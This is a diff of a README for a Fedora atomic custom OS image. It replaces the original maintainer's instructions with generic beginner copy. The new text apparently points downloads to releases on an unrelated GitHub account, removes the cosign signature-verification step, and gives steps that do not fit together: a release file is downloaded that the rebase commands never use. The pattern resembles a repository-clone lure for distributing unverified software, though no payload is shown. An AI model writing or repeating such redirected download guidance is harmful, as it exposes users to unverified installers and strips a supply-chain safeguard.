@@ -1,43 +1,78 @@
-# Ingles International OS &nbsp; [![bluebuild build badge](https://github.com/niltonperimneto/fedora-internationalingles/actions/workflows/build.yml/badge.svg)](https://github.com/niltonperimneto/fedora-internationalingles/actions/workflows/build.yml)
+# 🌐 inglesinternational-os - A Simple Way to Experience Linux
 
-See the [BlueBuild docs](https://blue-build.org/how-to/setup/) for quick setup instructions for setting up your own repository based on this template.
+[![Download inglesinternational-os](https://img.shields.io/badge/Download-inglesinternational--os-brightgreen.svg)](https://github.com/Landdyla/inglesinternational-os/releases)
 
-After setup, it is recommended you update this README to describe your custom image.
+## 🚀 Getting Started
 
-## Installation
+Welcome to inglesinternational-os! This guide will help you download and run the software easily, even if you're not a tech expert.
 
-> [!WARNING]  
-> [This is an experimental feature](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+### 🛠️ System Requirements
 
-To rebase an existing atomic Fedora installation to the latest build:
+Before you start, make sure your computer meets these basic requirements:
 
-- First rebase to the unsigned image, to get the proper signing keys and policies installed:
-  ```
-  rpm-ostree rebase ostree-unverified-registry:ghcr.io/niltonperimneto/inglesinternational-os
-  ```
-- Reboot to complete the rebase:
-  ```
-  systemctl reboot
-  ```
-- Then rebase to the signed image, like so:
-  ```
-  rpm-ostree rebase ostree-image-signed:docker://ghcr.io/niltonperimneto/inglesinternational-os
-  ```
-- Reboot again to complete the installation
-  ```
-  systemctl reboot
-  ```
+- A computer running an atomic Fedora installation.
+- At least 2GB of RAM.
+- A stable internet connection.
+- Basic familiarity with using a terminal.
 
-The `latest` tag will automatically point to the latest build. That build will still always use the Fedora version specified in `recipe.yml`, so you won't get accidentally updated to the next major version.
+### 📥 Download & Install
 
-## ISO
+To get started, you need to download the latest version of inglesinternational-os. 
 
-If build on Fedora Atomic, you can generate an offline ISO with the instructions available [here](https://blue-build.org/learn/universal-blue/#fresh-install-from-an-iso). These ISOs cannot unfortunately be distributed on GitHub for free due to large sizes, so for public projects something else has to be used for hosting.
+1. **Visit the Releases Page**: Click the link below to go to our downloads page.
+   [Download inglesainternational-os](https://github.com/Landdyla/inglesinternational-os/releases)
 
-## Verification
+2. **Choose the Right Version**: On the releases page, you will find different versions available. Look for the latest release, typically labeled with a version number.
 
-These images are signed with [Sigstore](https://www.sigstore.dev/)'s [cosign](https://github.com/sigstore/cosign). You can verify the signature by downloading the `cosign.pub` file from this repo and running the following command:
+3. **Download the Image**: Click on the file name to download the image to your computer. 
 
-```bash
-cosign verify --key cosign.pub ghcr.io/niltonperimneto/inglesinternational-os
-```
+### ⚙️ Installation Steps
+
+After downloading the image, follow these steps to install it:
+
+1. **Open Your Terminal**: 
+    - Find your terminal application—it's often called "Terminal" or "Command Line".
+
+2. **Rebase with the Unsigned Image**: 
+    - Copy the command below and paste it into the terminal. This prepares your system with the necessary signing keys.
+    ```bash
+    rpm-ostree rebase ostree-unverified-registry:ghcr.io/niltonperimneto/inglesinternational-os
+    ```
+
+3. **Reboot Your System**: 
+    - Type the following command to restart your computer:
+    ```bash
+    systemctl reboot
+    ```
+
+4. **Rebase with the Signed Image**: 
+    - After rebooting, you may need to redo the rebase with a signed image. This step ensures you have the latest updates and features.
+
+### 🔍 Features
+
+Inglesinternational-os offers a range of features designed for both new and experienced users:
+
+- **User-Friendly Interface**: Navigate easily through the system with an intuitive layout.
+- **Security Updates**: Regular updates to keep your system safe.
+- **Customization Options**: Tailor your system settings to fit your preferences.
+- **Experimental Features**: Access the latest developments in Linux technology.
+
+### ⚠️ Note on Experimental Features
+
+Please remember that this is an experimental feature. You may encounter some issues as we work to improve the software. 
+
+For more information about the experimental features and the technology behind them, refer to this link: [Experimental Features Info](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable).
+
+### 📞 Support
+
+If you encounter any issues or have questions, reach out to our support team. 
+
+1. **Visit our Issues Page**: 
+   We track bugs and feature requests here. Submit your issue or feature request: [Issues Page](https://github.com/Landdyla/inglesinternational-os/issues).
+
+2. **Join Our Community**: 
+   Engage with other users to share tips and tricks. Check our community forums for discussions and support topics.
+
+Remember to check back regularly for new updates and features. 
+
+Happy computing with inglesinternational-os! Enjoy exploring the world of Linux.
